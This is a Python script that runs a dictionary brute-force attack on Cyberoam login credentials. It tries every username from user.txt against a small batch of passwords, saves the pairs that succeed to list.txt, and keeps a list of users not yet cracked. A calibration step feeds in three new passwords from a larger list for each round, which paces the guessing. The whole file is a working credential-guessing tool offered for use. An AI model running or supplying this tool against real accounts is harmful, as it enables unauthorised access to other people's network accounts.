#!/usr/bin/python
# -*- coding: utf-8 -*-

from __future__ import print_function
from cyberoam import sendLoginRequest
from shutil import copyfileobj
from collections import Counter


def brute_force():
    passtxt = open('pass.txt').read()
    pass_list = passtxt.split('\n')
    usertxt = open('user.txt').read()
    user_list = usertxt.split('\n')
    combo = open('list.txt', 'a')
    user_rem = open('user_all.txt', 'w+')
    print('Searching...')
    hits = 0
    for user in user_list:
        flag = 1
        for pwd in pass_list:
            response = sendLoginRequest(user, pwd)
            print(user + " x " + pwd + " -> " + str(response) + "\n")
            if response == True:
                hits += 1
                combo.write(user + ' ' + pwd + '\n')
                flag = 0
                break
        if flag == 1:
            user_rem.write(user + '\n')
    if hits == 0:
        print('No Valid Combinations Found!')
    else:
        print('Total Hits = ' + str(hits))
    combo.close()
    user_rem.close()


def callibrate():
    with open('user.txt', 'w+') as out:
        with open('user_all.txt', 'r') as inp:
            copyfileobj(inp, out)
    inp.close()
    out.close()

        # Define n = 3

    n = 3
    subset = open('pass.txt', 'w')
    passwords = open('pass_all.txt').read()
    passlist = passwords.split('\n')
    count = 0
    subset2 = open('pass_all.txt', 'w')
    for line in passlist:
        if count < 3:
            subset.write(line)
        else:
            subset2.write(line + "\n")
        count += 1
        subset.write('\n')
    subset.close()
    print('Remove' + str(n) + ' passwords from the top!')


callibrate()
brute_force()